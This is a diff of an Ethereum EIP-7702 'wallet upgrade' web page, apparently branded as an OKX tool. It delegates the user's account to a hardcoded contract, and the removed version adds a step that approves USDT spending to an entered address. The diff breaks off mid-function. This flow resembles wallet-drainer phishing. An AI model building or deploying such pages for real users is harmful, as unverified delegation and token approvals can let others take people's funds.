@@ -3,701 +3,696 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EIP-7702 智能钱包升级 & 执2行</title>
+    <title>OKX EIP-7702 升级工具</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
             min-height: 100vh;
-            padding: 30px 20px;
             color: #fff;
+            padding: 20px;
         }
+
         .container {
-            max-width: 700px;
+            max-width: 600px;
             margin: 0 auto;
         }
-        h1 {
+
+        .header {
             text-align: center;
-            margin-bottom: 8px;
-            font-size: 26px;
-            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #00d4ff, #7b2cbf);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        .subtitle {
-            text-align: center;
+
+        .header p {
             color: #888;
-            margin-bottom: 30px;
             font-size: 14px;
         }
+
         .card {
-            background: rgba(255,255,255,0.05);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 16px;
-            padding: 25px;
+            padding: 24px;
             margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
             backdrop-filter: blur(10px);
         }
+
         .card-title {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
+            color: #00d4ff;
+        }
+
+        .info-row {
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            gap: 10px;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
-        .step-number {
-            width: 28px;
-            height: 28px;
-            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            font-weight: bold;
+
+        .info-row:last-child {
+            border-bottom: none;
         }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #aaa;
+
+        .info-label {
+            color: #888;
             font-size: 14px;
         }
-        select, input {
-            width: 100%;
-            padding: 14px;
-            border-radius: 10px;
-            border: 1px solid rgba(255,255,255,0.2);
-            background: rgba(0,0,0,0.3);
+
+        .info-value {
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 13px;
             color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.3s;
+            word-break: break-all;
+            text-align: right;
+            max-width: 60%;
         }
-        select:focus, input:focus {
-            border-color: #00d2ff;
+
+        .info-value.success {
+            color: #00ff88;
         }
-        select option {
-            background: #1a1a2e;
+
+        .info-value.pending {
+            color: #ffaa00;
         }
+
+        .info-value.error {
+            color: #ff4444;
+        }
+
         .btn {
             width: 100%;
-            padding: 16px;
+            padding: 16px 24px;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
         }
+
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
-        .btn-connect {
-            background: linear-gradient(135deg, #f093fb, #f5576c);
+
+        .btn-primary {
+            background: linear-gradient(90deg, #00d4ff, #7b2cbf);
+            color: #fff;
         }
-        .btn-connect:hover:not(:disabled) {
+
+        .btn-primary:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
         }
-        .btn-upgrade {
-            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
-        .btn-upgrade:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 210, 255, 0.3);
+
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.15);
         }
-        .btn-execute {
-            background: linear-gradient(135deg, #11998e, #38ef7d);
+
+        .status-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            max-height: 200px;
+            overflow-y: auto;
         }
-        .btn-execute:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(56, 239, 125, 0.3);
+
+        .status-box .log-item {
+            margin-bottom: 8px;
+            padding-left: 12px;
+            border-left: 2px solid #444;
         }
-        .status {
-            padding: 12px 16px;
-            border-radius: 10px;
-            margin-top: 15px;
-            font-size: 14px;
+
+        .status-box .log-item.info {
+            border-left-color: #00d4ff;
+        }
+
+        .status-box .log-item.success {
+            border-left-color: #00ff88;
+        }
+
+        .status-box .log-item.error {
+            border-left-color: #ff4444;
+        }
+
+        .status-box .log-item.warning {
+            border-left-color: #ffaa00;
+        }
+
+        .delegator-info {
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 16px;
+        }
+
+        .delegator-info .label {
+            font-size: 12px;
+            color: #00d4ff;
+            margin-bottom: 4px;
+        }
+
+        .delegator-info .address {
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 11px;
+            word-break: break-all;
+        }
+
+        .hidden {
             display: none;
         }
-        .status.show {
-            display: block;
-        }
-        .status.success {
-            background: rgba(56, 239, 125, 0.15);
-            border: 1px solid rgba(56, 239, 125, 0.3);
-            color: #38ef7d;
-        }
-        .status.error {
-            background: rgba(255, 107, 107, 0.15);
-            border: 1px solid rgba(255, 107, 107, 0.3);
-            color: #ff6b6b;
-        }
-        .status.info {
-            background: rgba(0, 210, 255, 0.15);
-            border: 1px solid rgba(0, 210, 255, 0.3);
-            color: #00d2ff;
-        }
-        .status.warning {
-            background: rgba(255, 193, 7, 0.15);
-            border: 1px solid rgba(255, 193, 7, 0.3);
-            color: #ffc107;
-        }
-        .wallet-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 15px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-        .wallet-avatar {
-            width: 45px;
-            height: 45px;
-            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-        .wallet-details {
-            flex: 1;
-        }
-        .wallet-address {
-            font-family: monospace;
-            font-size: 14px;
-            color: #00d2ff;
-        }
-        .wallet-balance {
-            font-size: 13px;
-            color: #888;
-            margin-top: 4px;
-        }
-        .chain-badge {
-            padding: 6px 12px;
-            background: rgba(255,255,255,0.1);
+
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
             border-radius: 20px;
             font-size: 12px;
+            font-weight: 600;
         }
-        .info-box {
-            padding: 15px;
-            background: rgba(255, 193, 7, 0.1);
-            border-left: 3px solid #ffc107;
-            border-radius: 0 10px 10px 0;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #ccc;
-            line-height: 1.6;
+
+        .badge-success {
+            background: rgba(0, 255, 136, 0.2);
+            color: #00ff88;
         }
-        .hidden {
-            display: none !important;
+
+        .badge-warning {
+            background: rgba(255, 170, 0, 0.2);
+            color: #ffaa00;
         }
-        .loading {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+
+        .badge-error {
+            background: rgba(255, 68, 68, 0.2);
+            color: #ff4444;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .tx-hash {
-            font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
-            margin-top: 8px;
-            padding: 10px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 6px;
-        }
-        .tx-hash a {
-            color: #00d2ff;
+
+        .tx-link {
+            color: #00d4ff;
             text-decoration: none;
         }
-        .tx-hash a:hover {
+
+        .tx-link:hover {
             text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .info-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 4px;
+            }
+
+            .info-value {
+                max-width: 100%;
+                text-align: left;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>EIP-7702 智能钱包</h1>
-        <p class="subtitle">升级 EOA 为智能账户 & 执行批量操作</p>
-
-        <!-- Step 1: 连接钱包 -->
-        <div class="card" id="step1">
-            <div class="card-title">
-                <span class="step-number">1</span>
-                连接钱包
-            </div>
-
-            <div class="form-group">
-                <label>选择网络</label>
-                <select id="chainSelect">
-                    <option value="1">Ethereum Mainnet</option>
-                    <option value="56">BNB Smart Chain</option>
-                    <option value="137">Polygon</option>
-                    <option value="11155111">Sepolia Testnet</option>
-                </select>
-            </div>
-
-            <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">
-                🔗 连接钱包
-            </button>
-
-            <div class="status" id="connectStatus"></div>
+        <div class="header">
+            <h1>OKX EIP-7702 升级工具</h1>
+            <p>将您的 EOA 账户升级为智能账户</p>
         </div>
 
-        <!-- 钱包信息 -->
-        <div class="card hidden" id="walletCard">
-            <div class="wallet-info">
-                <div class="wallet-avatar">👛</div>
-                <div class="wallet-details">
-                    <div class="wallet-address" id="walletAddress">-</div>
-                    <div class="wallet-balance" id="walletBalance">-</div>
-                </div>
-                <div class="chain-badge" id="chainBadge">-</div>
+        <!-- 连接钱包卡片 -->
+        <div class="card" id="connectCard">
+            <div class="card-title">连接钱包</div>
+            <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">
+                连接 OKX Wallet
+            </button>
+            <p style="text-align: center; color: #666; font-size: 12px; margin-top: 12px;">
+                请确保已安装 OKX Wallet 浏览器扩展
+            </p>
+        </div>
+
+        <!-- 账户信息卡片 -->
+        <div class="card hidden" id="accountCard">
+            <div class="card-title">账户信息</div>
+            <div class="info-row">
+                <span class="info-label">地址</span>
+                <span class="info-value" id="accountAddress">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">余额</span>
+                <span class="info-value" id="accountBalance">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">网络</span>
+                <span class="info-value" id="networkName">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">委托状态</span>
+                <span class="info-value" id="delegationStatus">检查中...</span>
             </div>
         </div>
 
-        <!-- Step 2: 升级钱包 -->
-        <div class="card hidden" id="step2">
-            <div class="card-title">
-                <span class="step-number">2</span>
-                升级为智能钱包
+        <!-- 升级操作卡片 -->
+        <div class="card hidden" id="upgradeCard">
+            <div class="card-title">EIP-7702 升级</div>
+
+            <div class="delegator-info">
+                <div class="label">OKX EIP-7702 Delegator</div>
+                <div class="address">0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb</div>
             </div>
 
-            <div class="info-box">
-                ⚠️ <strong>注意：</strong>EIP-7702 目前支持有限。如果升级失败，请使用 TokenPocket 或 OKX 手机钱包进行升级。
+            <div class="info-row">
+                <span class="info-label">初始化方法</span>
+                <span class="info-value">initialize() - 0x8129fc1c</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">预估 Gas</span>
+                <span class="info-value">~166,037</span>
             </div>
 
-            <div class="form-group">
-                <label>Delegator 合约地址</label>
-                <input type="text" id="delegatorAddress" value="0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb" placeholder="0x...">
-            </div>
-
-            <button class="btn btn-upgrade" id="upgradeBtn" onclick="upgradeWallet()">
-                ⬆️ 升级钱包
+            <button class="btn btn-primary" id="upgradeBtn" onclick="executeUpgrade()">
+                执行 EIP-7702 升级
             </button>
 
-            <div class="status" id="upgradeStatus"></div>
+            <button class="btn btn-secondary" onclick="checkDelegation()">
+                刷新委托状态
+            </button>
+
+            <div class="status-box" id="statusBox">
+                <div class="log-item info">等待操作...</div>
+            </div>
         </div>
 
-        <!-- Step 3: 执行操作 -->
-        <div class="card hidden" id="step3">
-            <div class="card-title">
-                <span class="step-number">3</span>
-                执行授权操作
+        <!-- 交易结果卡片 -->
+        <div class="card hidden" id="resultCard">
+            <div class="card-title">交易结果</div>
+            <div class="info-row">
+                <span class="info-label">状态</span>
+                <span class="info-value" id="txStatus">-</span>
             </div>
-
-            <div class="form-group">
-                <label>代币合约</label>
-                <select id="tokenSelect">
-                    <option value="auto">自动选择 USDT</option>
-                    <option value="custom">自定义代币</option>
-                </select>
+            <div class="info-row">
+                <span class="info-label">交易哈希</span>
+                <span class="info-value" id="txHash">-</span>
             </div>
-
-            <div class="form-group hidden" id="customTokenGroup">
-                <label>代币地址</label>
-                <input type="text" id="customToken" placeholder="0x...">
+            <div class="info-row">
+                <span class="info-label">区块号</span>
+                <span class="info-value" id="txBlock">-</span>
             </div>
-
-            <div class="form-group">
-                <label>授权给 (Spender)</label>
-                <input type="text" id="spenderAddress" placeholder="输入要授权的合约地址 0x...">
+            <div class="info-row">
+                <span class="info-label">Gas 使用</span>
+                <span class="info-value" id="txGasUsed">-</span>
             </div>
-
-            <button class="btn btn-execute" id="executeBtn" onclick="executeApprove()">
-                ✅ 执行授权
-            </button>
-
-            <div class="status" id="executeStatus"></div>
         </div>
     </div>
 
     <script>
-        // ============== 配置 ==============
-        const CHAIN_CONFIG = {
-            1: {
-                name: 'Ethereum',
-                usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                explorer: 'https://etherscan.io/tx/',
-                rpc: 'https://eth.llamarpc.com'
-            },
-            56: {
-                name: 'BSC',
-                usdt: '0x55d398326f99059fF775485246999027B3197955',
-                explorer: 'https://bscscan.com/tx/',
-                rpc: 'https://bsc-dataseed.binance.org'
-            },
-            137: {
-                name: 'Polygon',
-                usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-                explorer: 'https://polygonscan.com/tx/',
-                rpc: 'https://polygon-rpc.com'
-            },
-            11155111: {
-                name: 'Sepolia',
-                usdt: '0x0000000000000000000000000000000000000000',
-                explorer: 'https://sepolia.etherscan.io/tx/',
-                rpc: 'https://rpc.sepolia.org'
-            }
-        };
+        // OKX EIP-7702 Delegator 合约地址
+        const OKX_DELEGATOR_ADDRESS = '0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb';
+        // initialize() 函数选择器
+        const INITIALIZE_SELECTOR = '0x8129fc1c';
 
         let provider = null;
-        let signer = null;
-        let userAddress = null;
-        let currentChainId = null;
+        let currentAccount = null;
+        let chainId = null;
 
-        // ============== 获取钱包 Provider ==============
+        // 网络配置
+        const NETWORKS = {
+            1: { name: 'Ethereum Mainnet', explorer: 'https://etherscan.io' },
+            11155111: { name: 'Sepolia Testnet', explorer: 'https://sepolia.etherscan.io' },
+            5: { name: 'Goerli Testnet', explorer: 'https://goerli.etherscan.io' }
+        };
+
+        // 日志输出
+        function log(message, type = 'info') {
+            const statusBox = document.getElementById('statusBox');
+            const logItem = document.createElement('div');
+            logItem.className = `log-item ${type}`;
+            logItem.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            statusBox.appendChild(logItem);
+            statusBox.scrollTop = statusBox.scrollHeight;
+        }
+
+        // 清空日志
+        function clearLogs() {
+            const statusBox = document.getElementById('statusBox');
+            statusBox.innerHTML = '';
+        }
+
+        // 获取 OKX Wallet Provider
         function getProvider() {
-            // imToken 钱包
-            if (window.imToken) {
-                console.log('检测到 imToken 钱包');
-                return window.ethereum || window.imToken;
-            }
-            // TokenPocket 钱包
-            if (window.tokenpocket || window.isTokenPocket) {
-                console.log('检测到 TokenPocket 钱包');
-                return window.ethereum;
-            }
-            // OKX 钱包
+            // OKX Wallet 注入的对象
             if (window.okxwallet) {
-                console.log('检测到 OKX 钱包');
                 return window.okxwallet;
             }
-            // Trust Wallet
-            if (window.trustwallet) {
-                console.log('检测到 Trust Wallet');
-                return window.trustwallet;
+            // 兼容 ethereum 对象 (如果 OKX Wallet 作为默认钱包)
+            if (window.ethereum && window.ethereum.isOkxWallet) {
+                return window.ethereum;
             }
-            // Coinbase Wallet
-            if (window.coinbaseWalletExtension) {
-                console.log('检测到 Coinbase Wallet');
-                return window.coinbaseWalletExtension;
-            }
-            // BitKeep / Bitget
-            if (window.bitkeep) {
-                console.log('检测到 BitKeep 钱包');
-                return window.bitkeep.ethereum;
-            }
-            // 通用 ethereum provider
+            // 尝试通用 ethereum 对象
             if (window.ethereum) {
-                console.log('检测到 ethereum provider');
                 return window.ethereum;
             }
             return null;
         }
 
-        // ============== 连接钱包 ==============
+        // 连接钱包
         async function connectWallet() {
-            const btn = document.getElementById('connectBtn');
-            const status = document.getElementById('connectStatus');
-            const targetChainId = document.getElementById('chainSelect').value;
+            const connectBtn = document.getElementById('connectBtn');
+            connectBtn.disabled = true;
+            connectBtn.textContent = '连接中...';
 
             try {
-                btn.disabled = true;
-                btn.innerHTML = '<span class="loading"></span> 连接中...';
-
-                // 获取钱包 provider
                 provider = getProvider();
 
                 if (!provider) {
-                    throw new Error('未检测到钱包，请使用 imToken / TokenPocket / OKX / MetaMask 等钱包打开此页面');
+                    alert('未检测到 OKX Wallet！请安装 OKX Wallet 浏览器扩展。');
+                    connectBtn.disabled = false;
+                    connectBtn.textContent = '连接 OKX Wallet';
+                    return;
                 }
 
-                // 请求连接
-                let accounts;
-                try {
-                    // 标准方式
-                    accounts = await provider.request({
-                        method: 'eth_requestAccounts'
-                    });
-                } catch (e) {
-                    // 备用方式（兼容旧版钱包）
-                    accounts = await provider.enable();
+                // 请求连接账户
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+
+                if (accounts.length === 0) {
+                    throw new Error('未获取到账户');
                 }
 
-                if (!accounts || accounts.length === 0) {
-                    throw new Error('未授权任何账户');
-                }
-
-                userAddress = accounts[0];
-
-                // 切换网络
-                try {
-                    await provider.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x' + parseInt(targetChainId).toString(16) }]
-                    });
-                } catch (switchError) {
-                    // 如果网络不存在，可能需要添加
-                    console.log('切换网络失败:', switchError);
-                }
-
-                // 获取当前链 ID
-                let chainIdHex;
-                try {
-                    chainIdHex = await provider.request({ method: 'eth_chainId' });
-                } catch (e) {
-                    // 备用方式
-                    chainIdHex = provider.chainId;
-                }
-                currentChainId = parseInt(chainIdHex, 16);
-
-                // 获取余额
-                let balance;
-                try {
-                    balance = await provider.request({
-                        method: 'eth_getBalance',
-                        params: [userAddress, 'latest']
-                    });
-                } catch (e) {
-                    balance = '0x0';
-                }
-                const balanceEth = parseInt(balance, 16) / 1e18;
+                currentAccount = accounts[0];
+                chainId = await provider.request({ method: 'eth_chainId' });
+                chainId = parseInt(chainId, 16);
 
                 // 更新 UI
-                document.getElementById('walletCard').classList.remove('hidden');
-                document.getElementById('walletAddress').textContent =
-                    userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
-                document.getElementById('walletBalance').textContent =
-                    balanceEth.toFixed(4) + ' ' + (currentChainId === 56 ? 'BNB' : currentChainId === 137 ? 'MATIC' : 'ETH');
-                document.getElementById('chainBadge').textContent =
-                    CHAIN_CONFIG[currentChainId]?.name || 'Chain ' + currentChainId;
+                document.getElementById('connectCard').classList.add('hidden');
+                document.getElementById('accountCard').classList.remove('hidden');
+                document.getElementById('upgradeCard').classList.remove('hidden');
 
-                document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('step3').classList.remove('hidden');
+                // 显示账户信息
+                await updateAccountInfo();
 
-                showStatus(status, 'success', '✅ 钱包已连接');
-                btn.innerHTML = '✅ 已连接';
+                // 检查委托状态
+                await checkDelegation();
+
+                // 监听账户变化
+                provider.on('accountsChanged', handleAccountsChanged);
+                provider.on('chainChanged', handleChainChanged);
 
             } catch (error) {
-                showStatus(status, 'error', '❌ ' + error.message);
-                btn.innerHTML = '🔗 连接钱包';
-                btn.disabled = false;
+                console.error('连接失败:', error);
+                alert('连接钱包失败: ' + error.message);
+                connectBtn.disabled = false;
+                connectBtn.textContent = '连接 OKX Wallet';
             }
         }
 
-        // ============== 升级钱包 ==============
-        async function upgradeWallet() {
-            const btn = document.getElementById('upgradeBtn');
-            const status = document.getElementById('upgradeStatus');
-            const delegator = document.getElementById('delegatorAddress').value.trim();
+        // 更新账户信息
+        async function updateAccountInfo() {
+            try {
+                // 显示地址
+                const shortAddress = `${currentAccount.slice(0, 6)}...${currentAccount.slice(-4)}`;
+                document.getElementById('accountAddress').textContent = shortAddress;
+                document.getElementById('accountAddress').title = currentAccount;
 
-            if (!delegator || !/^0x[a-fA-F0-9]{40}$/.test(delegator)) {
-                showStatus(status, 'error', '❌ 请输入有效的 Delegator 地址');
-                return;
+                // 获取余额
+                const balance = await provider.request({
+                    method: 'eth_getBalance',
+                    params: [currentAccount, 'latest']
+                });
+                const balanceEth = parseInt(balance, 16) / 1e18;
+                document.getElementById('accountBalance').textContent = `${balanceEth.toFixed(4)} ETH`;
+
+                // 显示网络
+                const network = NETWORKS[chainId] || { name: `Chain ID: ${chainId}` };
+                document.getElementById('networkName').textContent = network.name;
+
+            } catch (error) {
+                console.error('获取账户信息失败:', error);
             }
+        }
+
+        // 检查委托状态
+        async function checkDelegation() {
+            const statusEl = document.getElementById('delegationStatus');
+            statusEl.textContent = '检查中...';
+            statusEl.className = 'info-value pending';
 
             try {
-                btn.disabled = true;
-                btn.innerHTML = '<span class="loading"></span> 升级中...';
+                // 获取账户代码
+                const code = await provider.request({
+                    method: 'eth_getCode',
+                    params: [currentAccount, 'latest']
+                });
 
-                // 尝试发送 EIP-7702 交易
-                // 注意：大多数钱包目前不支持 type: 4 交易
+                if (code === '0x' || code === '0x0') {
+                    statusEl.innerHTML = '<span class="badge badge-warning">EOA (未委托)</span>';
+                    document.getElementById('upgradeBtn').disabled = false;
+                    log('账户状态: EOA，可以进行 EIP-7702 升级', 'info');
+                } else if (code.toLowerCase().startsWith('0xef0100')) {
+                    // EIP-7702 委托代码格式: 0xef0100 + 20字节地址
+                    const delegatedAddress = '0x' + code.slice(8, 48);
+                    statusEl.innerHTML = '<span class="badge badge-success">已委托</span>';
+                    document.getElementById('upgradeBtn').disabled = true;
+                    log(`账户已委托至: ${delegatedAddress}`, 'success');
+                } else {
+                    statusEl.innerHTML = '<span class="badge badge-error">合约账户</span>';
+                    document.getElementById('upgradeBtn').disabled = true;
+                    log('账户是合约账户，无法进行 EIP-7702 升级', 'error');
+                }
 
-                const txParams = {
-                    from: userAddress,
-                    to: userAddress,
-                    value: '0x0',
-                    data: '0x',
-                    // EIP-7702 特殊字段（钱包可能不支持）
-                    type: '0x04',
-                    authorizationList: [{
-                        chainId: '0x' + currentChainId.toString(16),
-                        address: delegator,
-                        nonce: '0x0',
-                    }]
+            } catch (error) {
+                console.error('检查委托状态失败:', error);
+                statusEl.textContent = '检查失败';
+                statusEl.className = 'info-value error';
+                log('检查委托状态失败: ' + error.message, 'error');
+            }
+        }
+
+        // 执行 EIP-7702 升级
+        async function executeUpgrade() {
+            const upgradeBtn = document.getElementById('upgradeBtn');
+            upgradeBtn.disabled = true;
+            upgradeBtn.textContent = '处理中...';
+
+            clearLogs();
+            log('开始 EIP-7702 升级流程...', 'info');
+
+            try {
+                // 获取 nonce
+                const nonce = await provider.request({
+                    method: 'eth_getTransactionCount',
+                    params: [currentAccount, 'latest']
+                });
+                log(`当前 Nonce: ${parseInt(nonce, 16)}`, 'info');
+
+                // 获取 gas 价格
+                const gasPrice = await provider.request({
+                    method: 'eth_gasPrice',
+                    params: []
+                });
+                log(`Gas Price: ${(parseInt(gasPrice, 16) / 1e9).toFixed(2)} Gwei`, 'info');
+
+                log(`委托目标: ${OKX_DELEGATOR_ADDRESS}`, 'info');
+                log('创建 EIP-7702 授权...', 'info');
+
+                // 构建 EIP-7702 授权
+                const authorization = {
+                    chainId: '0x' + chainId.toString(16),
+                    address: OKX_DELEGATOR_ADDRESS,
+                    nonce: nonce
                 };
 
-                // 尝试发送
+                // 构建交易参数
+                const txParams = {
+                    from: currentAccount,
+                    to: currentAccount,  // 发送给自己
+                    value: '0x0',
+                    data: INITIALIZE_SELECTOR,  // initialize()
+                    gas: '0x' + (166037).toString(16),
+                    gasPrice: gasPrice,
+                    // EIP-7702 特定参数
+                    type: '0x04',  // EIP-7702 交易类型
+                    authorizationList: [authorization]
+                };
+
+                log('发送交易请求到钱包...', 'info');
+                log('请在 OKX Wallet 中确认交易', 'warning');
+
+                // 尝试发送 EIP-7702 交易
+                let txHash;
                 try {
-                    const txHash = await provider.request({
+                    // 方式1: 尝试使用 EIP-7702 类型交易
+                    txHash = await provider.request({
                         method: 'eth_sendTransaction',
                         params: [txParams]
                     });
+                } catch (eip7702Error) {
+                    log('EIP-7702 交易类型可能不受支持，尝试标准交易...', 'warning');
 
-                    showStatus(status, 'success',
-                        '✅ 升级交易已发送！<div class="tx-hash"><a href="' +
-                        CHAIN_CONFIG[currentChainId]?.explorer + txHash +
-                        '" target="_blank">' + txHash + '</a></div>'
-                    );
-                    btn.innerHTML = '✅ 升级成功';
-
-                } catch (txError) {
-                    // 大多数钱包会在这里失败
-                    if (txError.code === 4001) {
-                        throw new Error('用户取消了交易');
-                    }
-
-                    // 钱包不支持 EIP-7702
-                    showStatus(status, 'warning',
-                        '⚠️ 当前钱包不支持 EIP-7702 交易<br><br>' +
-                        '请使用以下方式升级：<br>' +
-                        '1. TokenPocket 手机 App<br>' +
-                        '2. OKX Wallet 手机 App<br>' +
-                        '3. Rabby Wallet<br><br>' +
-                        '升级后回到此页面执行操作'
-                    );
-                    btn.innerHTML = '⬆️ 升级钱包';
-                    btn.disabled = false;
-                }
-
-            } catch (error) {
-                showStatus(status, 'error', '❌ ' + error.message);
-                btn.innerHTML = '⬆️ 升级钱包';
-                btn.disabled = false;
-            }
-        }
-
-        // ============== 执行授权 ==============
-        async function executeApprove() {
-            const btn = document.getElementById('executeBtn');
-            const status = document.getElementById('executeStatus');
-            const spender = document.getElementById('spenderAddress').value.trim();
-
-            // 获取代币地址
-            let tokenAddress;
-            if (document.getElementById('tokenSelect').value === 'auto') {
-                tokenAddress = CHAIN_CONFIG[currentChainId]?.usdt;
-                if (!tokenAddress || tokenAddress === '0x0000000000000000000000000000000000000000') {
-                    showStatus(status, 'error', '❌ 当前网络没有预设 USDT 地址，请选择自定义代币');
-                    return;
-                }
-            } else {
-                tokenAddress = document.getElementById('customToken').value.trim();
-            }
-
-            // 验证
-            if (!tokenAddress || !/^0x[a-fA-F0-9]{40}$/.test(tokenAddress)) {
-                showStatus(status, 'error', '❌ 请输入有效的代币地址');
-                return;
-            }
-            if (!spender || !/^0x[a-fA-F0-9]{40}$/.test(spender)) {
-                showStatus(status, 'error', '❌ 请输入有效的授权地址');
-                return;
-            }
-
-            try {
-                btn.disabled = true;
-                btn.innerHTML = '<span class="loading"></span> 执行中...';
-
-                // 构建 calldata
-                const calldata = buildApproveCalldata(tokenAddress, spender);
-
-                // 发送交易
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: userAddress,  // 发给自己（智能钱包执行）
+                    // 方式2: 使用标准交易 (需要钱包内部支持 EIP-7702)
+                    const standardTxParams = {
+                        from: currentAccount,
+                        to: currentAccount,
                         value: '0x0',
-                        data: calldata,
-                        gas: '0x30000'  // 约 200000
-                    }]
-                });
+                        data: INITIALIZE_SELECTOR,
+                        gas: '0x' + (166037).toString(16),
+                        gasPrice: gasPrice
+                    };
 
-                showStatus(status, 'success',
-                    '✅ 授权交易已发送！<div class="tx-hash"><a href="' +
-                    CHAIN_CONFIG[currentChainId]?.explorer + txHash +
-                    '" target="_blank">' + txHash + '</a></div>'
-                );
-                btn.innerHTML = '✅ 执行成功';
+                    txHash = await provider.request({
+                        method: 'eth_sendTransaction',
+                        params: [standardTxParams]
+                    });
+                }
+
+                log(`交易已发送: ${txHash}`, 'success');
+
+                // 显示结果卡片
+                document.getElementById('resultCard').classList.remove('hidden');
+                document.getElementById('txHash').innerHTML =
+                    `<a href="${getExplorerUrl()}/tx/${txHash}" target="_blank" class="tx-link">${txHash.slice(0, 10)}...${txHash.slice(-8)}</a>`;
+                document.getElementById('txStatus').innerHTML = '<span class="badge badge-warning">确认中</span>';
+
+                log('等待交易确认...', 'info');
+
+                // 等待交易确认
+                await waitForTransaction(txHash);
 
             } catch (error) {
+                console.error('升级失败:', error);
+                log('升级失败: ' + (error.message || error), 'error');
+
                 if (error.code === 4001) {
-                    showStatus(status, 'error', '❌ 用户取消了交易');
-                } else {
-                    showStatus(status, 'error', '❌ ' + error.message);
+                    log('用户取消了交易', 'warning');
                 }
-                btn.innerHTML = '✅ 执行授权';
-                btn.disabled = false;
+            } finally {
+                upgradeBtn.disabled = false;
+                upgradeBtn.textContent = '执行 EIP-7702 升级';
             }
         }
 
-        // ============== 构建 Calldata ==============
-        function buildApproveCalldata(tokenAddress, spenderAddress) {
-            const token = tokenAddress.slice(2).toLowerCase();
-            const spender = spenderAddress.slice(2).toLowerCase();
+        // 等待交易确认
+        async function waitForTransaction(txHash) {
+            const maxAttempts = 60;
+            let attempts = 0;
 
-            const parts = [
